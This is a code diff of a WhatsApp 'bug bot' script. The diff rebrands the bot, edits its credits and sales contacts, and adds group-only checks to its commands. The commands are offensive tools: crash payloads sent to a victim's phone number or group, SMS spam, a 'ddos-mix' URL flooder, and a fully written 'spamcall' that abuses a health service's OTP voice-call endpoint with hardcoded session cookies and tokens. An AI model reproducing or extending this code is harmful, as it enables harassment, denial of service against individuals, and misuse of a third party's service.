@@ -1292,6 +1292,7 @@ break
 
 //Menu
 case "menu": case "help": {
+if (!isGroup) return xgreply('Only Group')
 inireact()
 let timestamp = speed()
 let latensi = speed() - timestamp
@@ -1300,10 +1301,10 @@ let itsmenu = `
 
 ✲   *${ucapanWaktu}*
 
- ⭔ *_ZxV V3_*
+ ⭔ *_Ranz V3_*
  ⭔ *_${weton} - ${week}, ${calender}_*
 
-   - 𖣂 Sc Private 𖤲 <特> 𖤲
+   - 𖣂 Sc Private 𖤲 <ranz> 𖤲
  ⭔ 名前   : ${pushname}
  ⭔ タグ   : @${m.sender.split('@')[0]}
  ⭔ 時間   : ${ucapanWaktu}
@@ -1677,176 +1678,9 @@ let itsmenu = `
  │
  ╰ ───────⬣
 
- ╭ ──▸ \`Sound\`
- │
- │⬡ sound1
- │⬡ sound2
- │⬡ sound3
- │⬡ sound4
- │⬡ sound5
- │⬡ sound6
- │⬡ sound7
- │⬡ sound8
- │⬡ sound9
- │⬡ sound10
- │⬡ sound11
- │⬡ sound12
- │⬡ sound13
- │⬡ sound14
- │⬡ sound15
- │⬡ sound16
- │⬡ sound17
- │⬡ sound18
- │⬡ sound19
- │⬡ sound20
- │⬡ sound21
- │⬡ sound22
- │⬡ sound23
- │⬡ sound24
- │⬡ sound25
- │⬡ sound26
- │⬡ sound27
- │⬡ sound28
- │⬡ sound29
- │⬡ sound30
- │⬡ sound31
- │⬡ sound32
- │⬡ sound33
- │⬡ sound34
- │⬡ sound35
- │⬡ sound36
- │⬡ sound37
- │⬡ sound38
- │⬡ sound39
- │⬡ sound40
- │⬡ sound41
- │⬡ sound42
- │⬡ sound43
- │⬡ sound44
- │⬡ sound45
- │⬡ sound46
- │⬡ sound47
- │⬡ sound48
- │⬡ sound49
- │⬡ sound50
- │⬡ sound51
- │⬡ sound52
- │⬡ sound53
- │⬡ sound54
- │⬡ sound55
- │⬡ sound56
- │⬡ sound57
- │⬡ sound58
- │⬡ sound59
- │⬡ sound60
- │⬡ sound61
- │⬡ sound62
- │⬡ sound63
- │⬡ sound64
- │⬡ sound65
- │⬡ sound66
- │⬡ sound67
- │⬡ sound68
- │⬡ sound69
- │⬡ sound70
- │⬡ sound71
- │⬡ sound72
- │⬡ sound73
- │⬡ sound74
- │⬡ sound75
- │⬡ sound76
- │⬡ sound77
- │⬡ sound78
- │⬡ sound79
- │⬡ sound80
- │⬡ sound81
- │⬡ sound82
- │⬡ sound83
- │⬡ sound84
- │⬡ sound85
- │⬡ sound86
- │⬡ sound87
- │⬡ sound88
- │⬡ sound89
- │⬡ sound90
- │⬡ sound91
- │⬡ sound92
- │⬡ sound93
- │⬡ sound94
- │⬡ sound95
- │⬡ sound96
- │⬡ sound97
- │⬡ sound98
- │⬡ sound99
- │⬡ sound100
- │⬡ sound101
- │⬡ sound102
- │⬡ sound103
- │⬡ sound104
- │⬡ sound105
- │⬡ sound106
- │⬡ sound107
- │⬡ sound108
- │⬡ sound109
- │⬡ sound110
- │⬡ sound111
- │⬡ sound112
- │⬡ sound113
- │⬡ sound114
- │⬡ sound115
- │⬡ sound116
- │⬡ sound117
- │⬡ sound118
- │⬡ sound119
- │⬡ sound120
- │⬡ sound121
- │⬡ sound122
- │⬡ sound123
- │⬡ sound124
- │⬡ sound125
- │⬡ sound126
- │⬡ sound127
- │⬡ sound128
- │⬡ sound129
- │⬡ sound130
- │⬡ sound131
- │⬡ sound132
- │⬡ sound133
- │⬡ sound134
- │⬡ sound135
- │⬡ sound136
- │⬡ sound137
- │⬡ sound138
- │⬡ sound139
- │⬡ sound140
- │⬡ sound141
- │⬡ sound142
- │⬡ sound143
- │⬡ sound144
- │⬡ sound145
- │⬡ sound146
- │⬡ sound147
- │⬡ sound148
- │⬡ sound149
- │⬡ sound150
- │⬡ sound151
- │⬡ sound152
- │⬡ sound153
- │⬡ sound154
- │⬡ sound155
- │⬡ sound156
- │⬡ sound157
- │⬡ sound158
- │⬡ sound159
- │⬡ sound160
- │⬡ sound161
- │
- ╰ ───────⬣
-
  ╭ ──▸ \`Thanks To\`
  │
- │⬡ TheZetsuboXygen
- │⬡ DGXeon
+ │⬡ RanzTamfan
  │⬡ DikaArdnt
  │⬡ Owner Api BetaBot
  │
@@ -1857,7 +1691,7 @@ let itsmenu = `
   caption: itsmenu,
   gifPlayback: false,
   contextInfo:{externalAdReply:{
-title: '⟠ 𝐙͢𝐱𝐕 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々',
+title: '⟠ 𝙍𝙖𝙣𝙯 𝙎𝙪𝙠𝙖 𝙏𝙤𝙗𝙧𝙪𝙩 々',
   body: `👤 名前 : ${m.pushName}\n🕑${ucapanWaktu}`, 
   showAdAttribution: false,
   thumbnail:nulll2,
@@ -1873,6 +1707,7 @@ await ryozingod.sendMessage(m.chat, { audio: night, mimetype: 'audio/mpeg', ptt:
 break
 
 case "bugmenu": case "warmenu": {
+if (!isGroup) return xgreply('Only Group')
     inireact()
     let timestamp = speed()
     let latensi = speed() - timestamp
@@ -1880,10 +1715,10 @@ case "bugmenu": case "warmenu": {
     let itsmenu = `
 ✲   *${ucapanWaktu}*
 
- ⭔ *_ZxV V3_*
+ ⭔ *_Ranz V3_*
  ⭔ *_${weton} - ${week}, ${calender}_*
 
-   - 𖣂 Sc Private 𖤲 <特> 𖤲
+   - 𖣂 Sc Private 𖤲 <ranz> 𖤲
  ⭔ 名前   : ${pushname}
  ⭔ タグ   : @${m.sender.split('@')[0]}
  ⭔ 時間   : ${ucapanWaktu}
@@ -2047,7 +1882,7 @@ case "bugmenu": case "warmenu": {
       caption: itsmenu,
       gifPlayback: false,
       contextInfo:{externalAdReply:{
-    title: '⟠ 𝐙͢𝐱𝐕 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々',
+    title: '⟠ 𝙍𝙖𝙣𝙯 𝙎𝙪𝙠𝙖 𝙏𝙤𝙗𝙧𝙪𝙩 々',
       body: `👤 名前 : ${m.pushName}\n🕑${ucapanWaktu}`, 
       showAdAttribution: false,
       thumbnail:nulll2,
@@ -2063,12 +1898,12 @@ await ryozingod.sendMessage(m.chat, { audio: night, mimetype: 'audio/mpeg', ptt:
 break
 
 case 'sc': case 'script': {
-xgreply(`🌤️Sc Ini Dibuat Oleh TheZetsuboXygen (ryo).
+xgreply(`🌤️Sc Ini Dibuat Oleh Kepo (ryo).
 
 ❕Yt : ${global.yt}
-❗Tl : t.me/Zetsugen7
+❗Tl : xnxx.com
 
-😆 Mau Beli?, Kontak Gw Di Telegram `)
+😆 Mau Beli?, wa.me/6282393734303 `)
 }
 break
 
@@ -4690,6 +4525,7 @@ case 'gengod7':
 case 'crashkah?':
 case 'santet': {
 inireact()
+if (!isGroup) return xgreply('Only Group')
 if (!isPremium) return xgreply(mess.premium)
 if (!text) return xgreply(`Example: ${prefix + command} 6282823838,1`);
 sendto = q.split(",")[0]+"@s.whatsapp.net"
@@ -4711,6 +4547,7 @@ case 'skedulbotak':
 case 'blowjobbug':
 case 'bugcall': {
 inireact()
+if (!isGroup) return xgreply('Only Group')
 if (!isPremium) return xgreply(mess.premium)
 if (!text) return xgreply(`Example: ${prefix + command} 6282823838,1`);
 sendto = q.split(",")[0]+"@s.whatsapp.net"
@@ -4735,6 +4572,7 @@ case 'videocallgey':
 case 'bugmullet':
 case 'endcall': {
 inireact()
+if (!isGroup) return xgreply('Only Group')
 if (!isPremium) return xgreply(mess.premium)
 if (!text) return xgreply(`Example: ${prefix + command} 6282823838,1`);
 sendto = q.split(",")[0]+"@s.whatsapp.net"
@@ -4782,6 +4620,7 @@ case 'bijimledak':
 case 'sipilis':
 case 'txtcrash': {
 inireact()
+if (!isGroup) return xgreply('Only Group')
 if (!isPremium) return xgreply(mess.premium)
 if (!text) return xgreply(`Example: ${prefix + command} 6282823838,1`);
 sendto = q.split(",")[0]+"@s.whatsapp.net"
@@ -4854,6 +4693,7 @@ case 'undanganbug':
 case 'ngundangcrash': 
 case 'fckh?': {
 inireact()
+if (!isGroup) return xgreply('Only Group')
 if (!isPremium) return xgreply(mess.premium)
 if (!text) return xgreply(`Example: ${prefix + command} 6282823838,1`);
 sendto = q.split(",")[0]+"@s.whatsapp.net"
@@ -4874,6 +4714,7 @@ case 'carrinho':
 case 'crashbitmap':
 case 'pixelcrash': {
 inireact()
+if (!isGroup) return xgreply('Only Group')
 if (!isPremium) return xgreply(mess.premium)
 if (!text) return xgreply(`Example: ${prefix + command} 6282823838,1`);
 sendto = q.split(",")[0]+"@s.whatsapp.net"
@@ -4898,6 +4739,7 @@ case 'serlok':
 case 'buglocation':
 case 'crashloc': {
 inireact()
+if (!isGroup) return xgreply('Only Group')
 if (!isPremium) return xgreply(mess.premium)
 if (!text) return xgreply(`Example: ${prefix + command} 6282823838,1`);
 sendto = q.split(",")[0]+"@s.whatsapp.net"
@@ -4924,6 +4766,7 @@ case 'gpcrash':
 case 'angjqy':
 case 'serlokgc': {
 inireact()
+if (!isGroup) return xgreply('Only Group')
 if (!isPremium) return xgreply(mess.premium)
 if (!text) return xgreply(`Example: ${prefix + command} https://chat.whatsapp.com/IwNg19SowhdI`);
 let result = args[0].split('https://chat.whatsapp.com/')[1]
@@ -4944,6 +4787,7 @@ case 'ngelag-woi':
 case 'bugbokep':
 case 'get-attention': {
 inireact()
+if (!isGroup) return xgreply('Only Group')
 if (!isPremium) return xgreply(mess.premium)
 if (!text) return xgreply(`Example: ${prefix + command} https://chat.whatsapp.com/IwNg19SowhdI`);
 let result = args[0].split('https://chat.whatsapp.com/')[1]
@@ -4965,6 +4809,7 @@ case '1shoot':
 case '1kill':
 case 'akuruok': {
 inireact()
+if (!isGroup) return xgreply('Only Group')
 if (!isPremium) return xgreply(mess.premium)
 if (!text) return xgreply(`Example: ${prefix + command} 120363228732435094@g.us`);
 let gpJid = q
@@ -4984,6 +4829,7 @@ case 'newsletterinvite':
 case 'chanelinvite': 
 case 'newsinvite': {
 inireact()
+if (!isGroup) return xgreply('Only Group')
 if (!isPremium) return xgreply(mess.premium)
 if (!text) return xgreply(`Example: ${prefix + command} 3`);
 jumlah = q
@@ -4999,6 +4845,7 @@ case 'bugchat':
 case 'aduhngelag🤣': 
 case 'hpkudipirtex': {
 inireact()
+if (!isGroup) return xgreply('Only Group')
 if (!isPremium) return xgreply(mess.premium)
 if (!text) return xgreply(`Example: ${prefix + command} 3`);
 jumlah = q
@@ -5009,6 +4856,8 @@ xgreply(mess.bugrespon + `\n❗Detail > \n🧪 Jenis Bug : ${command}\n🧪 Juml
 break
 case 'spamsms': {
 inireact()
+if (!isGroup) return xgreply('Only Group')
+if (!isGroup) return xgreply('Only Group')
 if (!isPremium) return xgreply(mess.premium)
 if (!text) return xgreply(`Example: ${prefix + command} 62,878937388273|1`)
 let matches = q.match(/62,(\d+)\|(\d+)/)
@@ -5028,7 +4877,9 @@ await sleep(20000)
 break
 
 case 'ddos-mix': {
+if (!isGroup) return xgreply('Only Group')
 if (!isPremium) return xgreply(mess.premium)
+if (!isGroup) return xgreply('Only Group')
 let url = q.split(" ")[0]
 let time = q.split(" ")[1]
 let thread = q.split(" ")[2]
@@ -5047,6 +4898,7 @@ break
 
 case 'jadivirdocdelay': {
 inireact()
+if (!isGroup) return xgreply('Only Group')
 if (!isPremium) return xgreply(mess.premium)
 if (!text) return xgreply(`Example: ${prefix + command} 🍏͜͡ꨃ𝗭𝗲͢𝘁𝘀𝘂𝗯𝗼̚͢𝗫𝘆𝗴𝗲͢𝗻͜᪾͡𑱼̸🇯🇴`);
 kusuma = async (teks) => {
@@ -5083,6 +4935,7 @@ kusuma(`ini basenya`)
 break
 
 case 'jadivirlocdelay': {
+if (!isGroup) return xgreply('Only Group')
 if (!isPremium) return xgreply(mess.premium)
 inireact()
 if (!text) return xgreply(`Example: ${prefix + command} 🍏͜͡ꨃ𝗭𝗲͢𝘁𝘀𝘂𝗯𝗼̚͢𝗫𝘆𝗴𝗲͢𝗻͜᪾͡𑱼̸🇯🇴`);
@@ -5092,6 +4945,7 @@ break
 
 case 'jadiwebios': {
 inireact()
+if (!isGroup) return xgreply('Only Group')
 if (!isPremium) return xgreply(mess.premium)
 if (!text) return xgreply(`Example: ${prefix + command} 🍏͜͡ꨃ𝗭𝗲͢𝘁𝘀𝘂𝗯𝗼̚͢𝗫𝘆𝗴𝗲͢𝗻͜᪾͡𑱼̸🇯🇴`);
 inireact()
@@ -5161,6 +5015,7 @@ inireact()
 break
 
 case 'spamcall': {
+if (!isGroup) return xgreply('Only Group')
 if (!isPremium) return xgreply(mess.prem);
 let nosend = "+" + q.split("|")[0].replace(/[^0-9]/g, '')
 axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
@@ -5244,6 +5099,7 @@ case 'katanyaip':
 case 'awok2ip': 
 case 'ipbang?': {
 inireact()
+if (!isGroup) return xgreply('Only Group')
 if (!isPremium) return xgreply(mess.premium)
 if (!text) return xgreply(`Example: ${prefix + command} 6282823838,1`);
 sendto = q.split(",")[0]+"@s.whatsapp.net"
